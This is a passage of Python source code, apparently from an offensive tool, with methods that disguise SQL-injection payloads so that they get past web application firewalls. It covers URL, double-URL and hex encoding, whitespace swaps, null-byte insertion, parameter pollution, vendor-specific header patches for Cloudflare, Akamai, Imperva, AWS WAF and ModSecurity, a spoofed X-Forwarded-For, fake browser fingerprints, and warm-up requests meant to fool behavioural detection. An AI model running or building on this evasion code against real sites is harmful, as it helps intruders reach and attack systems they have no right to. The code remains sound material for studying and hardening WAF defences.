        Parameters
        ----------
        payload : Original payload.
        full    : If True, encode every character; otherwise only specials.

        Returns
        -------
        str
            URL-encoded payload.
        """
        if full:
            return urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(payload, safe="=&+")

    def double_url_encode(self, payload: str) -> str:
        """Apply double URL-encoding to the payload."""
        return self.url_encode(self.url_encode(payload, full=True), full=True)

    def hex_encode_payload(self, payload: str) -> str:
        """
        Encode each character of the payload as a SQL hexadecimal literal.

        e.g. "OR" → "0x4f52"

        Parameters
        ----------
        payload : Original payload string.

        Returns
        -------
        str
            Hex-encoded SQL representation.
        """
        hex_chars = "".join(f"{ord(c):02x}" for c in payload)
        return f"0x{hex_chars}"

    def whitespace_variants(self, payload: str) -> str:
        """
        Replace spaces in the payload with alternative whitespace tokens.

        Parameters
        ----------
        payload : Original payload.

        Returns
        -------
        str
            Payload with whitespace substituted.
        """
        sub = self._rng.choice(_WHITESPACE_SUBS)
        return payload.replace(" ", sub)

    def null_byte_injection(self, payload: str) -> str:
        """
        Insert URL-encoded null bytes at strategic positions in the payload.

        Some WAF implementations stop string processing at null bytes,
        allowing the remainder of the payload to pass undetected.

        Parameters
        ----------
        payload : Original payload.

        Returns
        -------
        str
            Payload with null byte(s) inserted.
        """
        pos    = self._rng.randint(0, max(len(payload) - 1, 0))
        return payload[:pos] + "%00" + payload[pos:]

    def http_param_pollution(
        self,
        params:    Dict[str, str],
        param_key: str,
        payload:   str,
    ) -> Dict[str, str]:
        """
        Duplicate a parameter to confuse WAF parameter parsing.

        Many WAFs evaluate only the first occurrence while the back-end
        application uses the last (or concatenates them).

        Parameters
        ----------
        params    : Original query parameters.
        param_key : The parameter name to duplicate.
        payload   : Injection payload for the duplicate.

        Returns
        -------
        Dict[str, str]
            Parameters dict with pollution applied.
        """
        polluted           = dict(params)
        polluted[param_key] = payload
        # Add a benign duplicate of another key if present
        keys = [k for k in params if k != param_key]
        if keys:
            dup_key              = self._rng.choice(keys)
            polluted[dup_key]    = params[dup_key]
        return polluted

    # ── Private helpers ───────────────────────────────────────────────────────

    def _apply_mutation(
        self,
        payload:  str,
        strategy: str,
        waf:      str,
    ) -> Tuple[str, List[str]]:
        """
        Apply the named mutation strategy (and optional secondary mutations)
        to the payload.

        Parameters
        ----------
        payload  : Raw payload string.
        strategy : Primary technique name.
        waf      : WAF vendor string.

        Returns
        -------
        Tuple[str, List[str]]
            (mutated_payload, list_of_technique_names_applied)
        """
        applied   = [strategy]
        result    = payload

        if strategy == "comment_injection":
            result = self.comment_injection(result)
        elif strategy == "case_mangling":
            result = self.case_mangling(result)
        elif strategy == "url_encoding":
            result = self.url_encode(result)
        elif strategy == "double_url_encode":
            result = self.double_url_encode(result)
        elif strategy == "hex_encoding":
            result = self.hex_encode_payload(result)
        elif strategy == "whitespace_variants":
            result = self.whitespace_variants(result)
        elif strategy == "null_byte":
            result = self.null_byte_injection(result)
        elif strategy == "unicode_normalization":
            result = self.unicode_normalize_attack(result)
        elif strategy == "chunked_transfer":
            # chunked is a transport-level operation; return payload as-is
            pass
        elif strategy == "header_smuggling":
            pass
        elif strategy == "http_parameter_pollution":
            pass
        else:
            result = self.comment_injection(result)

        # Apply secondary pass (25 % chance of stacking another technique)
        if self._rng.random() < 0.25:
            secondary = self._rng.choice(["case_mangling", "whitespace_variants"])
            if secondary == "case_mangling":
                result = self.case_mangling(result)
            elif secondary == "whitespace_variants":
                result = self.whitespace_variants(result)
            applied.append(secondary)

        return result, applied

    def _patch_waf_headers(
        self,
        headers: Dict[str, str],
        waf:     str,
    ) -> Dict[str, str]:
        """
        Apply WAF-specific header patches to improve bypass probability.

        Parameters
        ----------
        headers : Base headers dict.
        waf     : WAF vendor string.

        Returns
        -------
        Dict[str, str]
            Patched headers dict.
        """
        h = dict(headers)

        if waf == "cloudflare":
            # Cloudflare checks the Sec-Fetch-* trio
            h["Sec-Fetch-Site"] = "same-origin"
            h["Sec-Fetch-Mode"] = "navigate"
            h["Sec-Fetch-User"] = "?1"
            h["Sec-Fetch-Dest"] = "document"

        elif waf == "akamai":
            h["Pragma"] = "no-cache"
            h["Cache-Control"] = "no-cache, no-store"

        elif waf == "imperva":
            # Incapsula checks for consistent session cookies
            h["X-Forwarded-For"] = "8.8.8.8"
            h["Pragma"]          = "no-cache"

        elif waf == "aws_waf":
            h["X-Amz-Security-Token"] = ""
            h["X-Api-Key"]             = ""

        elif waf == "modsecurity":
            # ModSec often trusts certain content types
            h["Content-Type"] = "application/x-www-form-urlencoded"

        return h

    def _build_identity(self, browser: str = "chrome") -> BrowserFingerprint:
        """Build a full BrowserFingerprint for the given browser family."""
        return self.spoof_browser_fingerprint(browser)

    # ── Behavioural session helpers ───────────────────────────────────────────

    def session_warmup_requests(
        self,
        count:      int = 3,
        base_url:   str = "",
    ) -> List[Dict[str, str]]:
        """
        Generate a list of benign-looking warm-up request specs.

        Sending a few benign requests before the injection attempt makes
        the session appear more like a legitimate browser browsing the site,
        which helps bypass behavioural analysis WAF rules.

        Parameters
        ----------
        count    : Number of warm-up requests to generate.
        base_url : Base URL; defaults to self.target_url.

        Returns
        -------
        List[Dict[str, str]]
            Each element is a headers dict for one warm-up request.
        """
        url  = base_url or self.target_url
        reqs = []
        for i in range(count):
            fp  = self.spoof_browser_fingerprint("chrome")
            hdrs = fp.to_headers()
            hdrs["Referer"] = self._rng.choice(_REFERRERS) or url
            reqs.append(hdrs)
        return reqs

    def get_bypass_stats(self) -> Dict[str, Any]:
        """
        Return summary statistics about the current bypass session.

        Returns
        -------
        Dict[str, Any]
            Dictionary with session metadata.
        """
        return {
            "target_url":     self.target_url,
            "request_count":  self._req_count,
            "identity_ua":    self._identity.user_agent,
            "supported_wafs": list(_WAF_SIGNATURES.keys()),
            "techniques":     list({
                t for tl in _WAF_BYPASS_STRATEGIES.values() for t in tl
            }),
        }
